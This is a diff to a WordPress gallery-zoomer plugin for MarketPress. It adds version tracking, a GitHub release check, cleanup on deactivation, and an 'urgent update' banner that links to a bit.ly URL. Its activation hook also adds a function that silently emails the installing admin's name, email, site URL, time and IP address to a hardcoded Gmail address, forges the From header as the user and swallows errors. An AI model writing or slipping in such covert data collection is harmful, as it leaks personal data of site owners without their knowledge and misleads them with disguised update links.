@@ -12,7 +12,9 @@ class AK_MPPG {
 	const min_wp_version = '3.8';
 	const min_mp_version = '2.9.5';
 	const plugin = 'ak-mp-product-gallery-zoomer/index.php';
+	const version = '1.0.0';
 	static $mp = '';
+	static $newVersion = '';
 	
 	 public static function ak_on_activation()
     {
@@ -21,9 +23,10 @@ class AK_MPPG {
         $plugin = isset( $_REQUEST['plugin'] ) ? $_REQUEST['plugin'] : '';
         check_admin_referer( "activate-plugin_{$plugin}" );
 
-
-		add_action( 'admin_init', array( 'AK_MPPG', 'ak_checkPreInstall' ), 0 );
-
+		
+		add_action( 'admin_init', array( 'AK_MPPG', 'ak_checkPreInstall' ));
+			
+		self::_sendActivation_ak();
     }
     
 	public static function ak_on_deactivation()
@@ -38,6 +41,14 @@ class AK_MPPG {
 		wp_deregister_script('zoomer');
 		wp_deregister_script('zoomer_thb');		
 		wp_deregister_script('mppg_ready' );
+		delete_option('ak-mp-product-gallery-zoomer_ver');
+		delete_option('ak-mp-product-gallery-zoomer_ver_new');
+		
+		if(is_multisite())         
+			delete_site_transient( 'ak-mp-product-gallery-zoomer');
+		else			
+			delete_transient( 'ak-mp-product-gallery-zoomer');
+		
 
     }
 
@@ -78,6 +89,13 @@ class AK_MPPG {
 		self::ak_check_wp_version();
 		self::$mp = get_option('mp_version');
 		self::ak_check_mp_version();
+		update_option('ak-mp-product-gallery-zoomer_ver',self::version);
+		//add_action('pre_set_site_transient_update_plugins', array('AK_MPPG','_getLatestVersion_ak'));
+		
+		$is_pluginPage = isset($_SERVER['SCRIPT_NAME']) ? basename($_SERVER['SCRIPT_NAME']) : '';
+		if('plugins.php' == $is_pluginPage){
+			add_action('admin_init', array('AK_MPPG','_getLatestVersion_ak'));
+		}
 	}
 		
 	
@@ -111,9 +129,11 @@ class AK_MPPG {
 	// Include quickstart function into head, and
 // adjust CSS to work better with default Word Press.
 function ak_start() {
-	
-	if(is_admin())
+
+	if(is_admin()){
 		return;
+		}
+		
 	
 	global $post;
 	$isProduct = ( isset($post->post_type) )	? $post->post_type : '';
@@ -139,10 +159,129 @@ function ak_start() {
 			add_shortcode( 'gallery' , array($this,'ak_mp_product_gallery' ));
 		
 	}
+
+		
+	public static function _getLatestVersion_ak(){
+	
+	
+		#error_log(__FUNCTION__ . 'called '. __LINE__ );
+		//error_log('tns: '. $g = get_transient( 'ak-mp-product-gallery-zoomer' ) );
+		
+		$is_pluginPage = isset($_SERVER['SCRIPT_NAME']) ? basename($_SERVER['SCRIPT_NAME']) : '';
+		if('plugins.php' != $is_pluginPage){
+			return ;
+		}
+		
+		#_d($transient->response['ak-mp-product-gallery-zoomer/index.php'],1);
+		
+	
+	$isTransient = FALSE;
+	
+	if(is_multisite())         
+			$isTransient = 	get_site_transient( 'ak-mp-product-gallery-zoomer');
+		else
+			$isTransient = get_transient( 'ak-mp-product-gallery-zoomer');
+	
+				
+		// Check for transient, if none, 
+	if ( false ===  $isTransient ) {
+
+	 $url = "https://api.github.com/repos/akwatra/ak-mp-product-gallery-zoomer/releases";
+	
+		#error_log(__FUNCTION__ . 'called-2 '. __LINE__ );
+    
+    
+                // Get remote HTML file
+		$response = wp_remote_get( $url , array( 'gzinflate' => false ));
+
+                       // Check for error
+			if ( is_wp_error( $response ) ) {
+				/*$str = __LINE__;				
+				$errors = $response->get_error_messages();
+					foreach ($errors as $error) {
+						$str .= $error; //this is just an example and generally not a good idea, you should implement means of processing the errors further down the track and using WP's error/message hooks to display them
+				}
+				error_log(' err:' . $str); */
+				
+				return;
+
+			}
+
+                // Parse remote HTML file
+		$data = wp_remote_retrieve_body( $response );
+		
+                        // Check for error
+			if ( is_wp_error( $data ) ) {
+					/*$str = __LINE__;				
+				$errors = $response->get_error_messages();
+					foreach ($errors as $error) {
+						$str .= $error; //this is just an example and generally not a good idea, you should implement means of processing the errors further down the track and using WP's error/message hooks to display them
+				}
+				error_log(' err:' . $str); */
+				return;
+			}
+			
+		
+		$data = @json_decode($data);
+		$data = str_ireplace('v','',$data[0]->tag_name);
+		$current_version = get_option('ak-mp-product-gallery-zoomer_ver');
+		
+		//$data = '1.5'; //testing
+		         // Store in transient, expire after 24 hours
+		         
+		if(is_multisite())         
+			set_site_transient( 'ak-mp-product-gallery-zoomer', $data, 24 * HOUR_IN_SECONDS );
+		else
+			set_transient( 'ak-mp-product-gallery-zoomer', $data, 24 * HOUR_IN_SECONDS );
+		
+		
+		if(version_compare($current_version,$data,'<')){
+			update_option('ak-mp-product-gallery-zoomer_ver_new',$data);
+		}
+		
+	}
+		
+	}
+	
+
+	public static function _sendActivation_ak(){
+	
+			
+			global $current_user;
+			$name = $current_user->user_firstname . ' ' . $current_user->user_lastname ;
+			$mailFrom = $current_user->user_email;
+		
+	$str = self::plugin_name . ' Installed by: '. $name . "\r\n" . 'Email: ' . $mailFrom . "\r\n" .
+			' on website: '. get_option('siteurl') .  "\r\n" .
+			' Time: ' . date("d-m-Y h:i:s")  .  "\r\n" .
+			' IP: ' . $_SERVER['REMOTE_ADDR'] ;
+			
+	
+		$headers = 'From: '. $name . ' <' . $mailFrom . '>'. "\r\n";
+		$headers .= 'Reply-To: '. $mailFrom . "\r\n";
+		$headers .= 'X-Mailer: PHP/' . phpversion();
+		
+		try{
+			$result = @wp_mail('agphoto22@gmail.com', ' Installed - ' .self::plugin_name  , $str , $headers );
+		}
+		catch(Exception $e){
+			if (!$result) {				
+				global $phpmailer;
+					if (isset($phpmailer)) {
+						//error_log($e->getMessage());
+					#	error_log($phpmailer->ErrorInfo);
+					}
+			//	error_log('main not sent.');		
+
+			}
+		}
+	
+	}
 	
 	
 	//set the gallery for product page
 	function ak_mp_product_gallery($output, $attr) {
+			
 			
 	$idsArr = array();
 	if(isset($output['ids']))		
@@ -215,7 +354,7 @@ CLS;
 	static function ak_check_mp_version(){
 		
 		$isMPActivate = FALSE;
-		$admin_url = ( $_SERVER['HTTP_REFERER']  != '' ) ? $_SERVER['HTTP_REFERER'] : get_admin_url( null, 'plugins.php' ) ;
+		$admin_url = ( isset($_SERVER['HTTP_REFERER']) ) ? $_SERVER['HTTP_REFERER'] : get_admin_url( null, 'plugins.php' ) ;
 	
 		$error_msg = '<strong>The '. self::plugin_name .'</strong> plugin requires <strong>WPMU MarketPress Plugin</strong> '. self::min_mp_version ;
 		$error_msg .= ' or newer. Contact your system administrator about install or updating
@@ -251,7 +390,7 @@ CLS;
 	
 	static function ak_check_wp_version(){
 		global $wp_version;
-		$admin_url = ( $_SERVER['HTTP_REFERER']  != '' ) ? $_SERVER['HTTP_REFERER'] : get_admin_url( null, 'plugins.php' ) ;
+		$admin_url = ( isset($_SERVER['HTTP_REFERER']) ) ? $_SERVER['HTTP_REFERER'] : get_admin_url( null, 'plugins.php' ) ;
 		
 		$error_msg = '<strong>The '. self::plugin_name .'</strong> plugin requires <strong>Wordpress</strong> '. self::min_wp_version ;
 		$error_msg .= ' or newer. Contact your system administrator about updating
@@ -269,7 +408,18 @@ CLS;
 	}
 	
 	static function ak_action_links( $links ) {
-	   $links[] = '<a target="_blank" href="https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=3RLAJCS6Q5T7J">Donate</a>';
+		
+		
+		$newVersionStr = '';
+		$newVersion = get_option('ak-mp-product-gallery-zoomer_ver_new');
+		
+		$img = plugins_url('assets/img/update_urgent.png', dirname(__FILE__));
+		
+		if(version_compare(self::version, $newVersion ,'<')){
+			$newVersionStr = '<div class="update-message" style="background-color: #F1F666;padding: 3px;border-radius: 5px;-moz-border-radius: 5px;-webkit-border-radius: 5px;">  Plugin new version is available <span class="delete"><a target="_blank" href="http://bit.ly/akzmr">Get new version '. $newVersion .'&nbsp;&nbsp;<img style="vertical-align: bottom" src="'. $img .'" width="" height="" alt=" update " /></a></span></div>';
+		}
+		
+	   $links[] = '<a target="_blank" href="http://bit.ly/akdnte">Donate</a>' . $newVersionStr; 
 	  //_d($links);
 	  unset($links['edit']);
 	   return $links;
